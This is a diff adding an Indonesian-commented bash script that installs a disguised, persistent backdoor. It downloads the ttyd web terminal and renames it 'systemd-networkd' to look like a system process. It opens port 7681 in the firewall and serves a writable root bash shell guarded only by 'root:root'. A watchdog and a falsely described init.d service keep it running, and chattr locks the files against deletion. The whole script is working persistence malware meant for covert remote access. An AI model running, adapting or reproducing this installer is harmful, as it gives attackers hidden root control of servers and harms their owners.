@@ -1,0 +1,123 @@
+#!/bin/bash
+# =================================================================
+# TRunX3000 - Standalone Persistent ttyd Installer
+# - Tanpa ketergantungan pada cron.
+# - Menggunakan proses daemon watchdog mandiri.
+# - Proses tetap disamarkan dan file tidak dapat dihapus.
+# =================================================================
+
+# Wajib dijalankan sebagai root
+if [ "$(id -u)" -ne 0 ]; then
+  echo "[!] Error: Script ini harus dijalankan sebagai root."
+  exit 1
+fi
+
+# --- Konfigurasi Kamuflase ---
+BINARY_URL="https://github.com/tsl0922/ttyd/releases/download/1.7.7/ttyd.x86_64"
+INSTALL_DIR="/usr/libexec"
+BINARY_NAME="systemd-networkd"
+BINARY_PATH="${INSTALL_DIR}/${BINARY_NAME}"
+WATCHDOG_NAME="networkd-watchdog"
+WATCHDOG_PATH="${INSTALL_DIR}/${WATCHDOG_NAME}"
+
+# --- Konfigurasi Service ---
+SERVICE_NAME="network-daemon"
+SERVICE_PATH="/etc/init.d/${SERVICE_NAME}"
+PORT="7681"
+CREDENTIALS="root:root"
+PID_FILE="/var/run/${WATCHDOG_NAME}.pid"
+
+echo "[*] Memulai instalasi ttyd dengan watchdog mandiri..."
+
+# --- 1. Pembersihan Instalasi Lama ---
+echo "[*] Membersihkan instalasi sebelumnya..."
+chattr -i ${BINARY_PATH} ${SERVICE_PATH} ${WATCHDOG_PATH} &>/dev/null
+service ${SERVICE_NAME} stop &>/dev/null
+chkconfig --del ${SERVICE_NAME} &>/dev/null
+pkill -f ${BINARY_NAME}
+pkill -f ${WATCHDOG_NAME}
+rm -f ${BINARY_PATH} ${SERVICE_PATH} ${WATCHDOG_PATH} /etc/init.d/ttyd
+
+# --- 2. Instalasi & Penyamaran Binary ---
+echo "[*] Mengunduh dan menyamarkan binary..."
+mkdir -p ${INSTALL_DIR}
+wget -q --no-check-certificate ${BINARY_URL} -O ${BINARY_PATH}
+chmod +x ${BINARY_PATH}
+
+# --- 3. Konfigurasi Firewall ---
+echo "[*] Mengkonfigurasi firewall untuk port ${PORT}..."
+iptables -I INPUT -p tcp --dport ${PORT} -j ACCEPT
+service iptables save
+
+# --- 4. Membuat Script Watchdog Mandiri ---
+echo "[*] Membuat script daemon watchdog..."
+cat > ${WATCHDOG_PATH} << EOF
+#!/bin/bash
+while true; do
+    if ! pgrep -f "${BINARY_PATH}" > /dev/null; then
+        nohup ${BINARY_PATH} -p ${PORT} -c ${CREDENTIALS} --writable bash &>/dev/null &
+    fi
+    sleep 10
+done
+EOF
+chmod +x ${WATCHDOG_PATH}
+
+# --- 5. Membuat Service Peluncur Watchdog (init.d) ---
+echo "[*] Membuat service '${SERVICE_NAME}' untuk persistensi saat boot..."
+cat > ${SERVICE_PATH} << EOF
+#!/bin/bash
+# chkconfig: 2345 99 10
+# description: Manages core networking services watchdog.
+
+WATCHDOG_DAEMON=${WATCHDOG_PATH}
+PIDFILE=${PID_FILE}
+
+start() {
+    if [ -f \$PIDFILE ]; then
+        echo "Watchdog sudah berjalan."
+    else
+        nohup \$WATCHDOG_DAEMON &> /dev/null &
+        echo \$! > \$PIDFILE
+        echo "Service watchdog ${SERVICE_NAME} dimulai."
+    fi
+}
+
+stop() {
+    if [ -f \$PIDFILE ]; then
+        kill \$(cat \$PIDFILE)
+        rm -f \$PIDFILE
+        pkill -f ${BINARY_NAME}
+        echo "Service watchdog ${SERVICE_NAME} dihentikan."
+    else
+        echo "Watchdog tidak berjalan."
+    fi
+}
+
+case "\$1" in
+    start) start ;;
+    stop) stop ;;
+    restart) stop; sleep 1; start ;;
+    *) echo "Usage: \$0 {start|stop|restart}" ;;
+esac
+EOF
+
+chmod +x ${SERVICE_PATH}
+chkconfig --add ${SERVICE_NAME}
+chkconfig ${SERVICE_NAME} on
+
+# --- 6. Menjalankan & Mengunci ---
+echo "[*] Menjalankan service watchdog..."
+service ${SERVICE_NAME} start
+sleep 2
+
+echo "[*] Mengunci file instalasi agar tidak dapat dihapus..."
+chattr +i ${BINARY_PATH}
+chattr +i ${WATCHDOG_PATH}
+chattr +i ${SERVICE_PATH}
+
+echo "=========================================================="
+echo "[+] SUKSES: Instalasi selesai."
+echo "    - Web terminal berjalan di port: ${PORT}"
+echo "    - Proses disamarkan dan dilindungi oleh watchdog mandiri."
+echo "    - Sistem sekarang sangat persisten."
+echo "=========================================================="
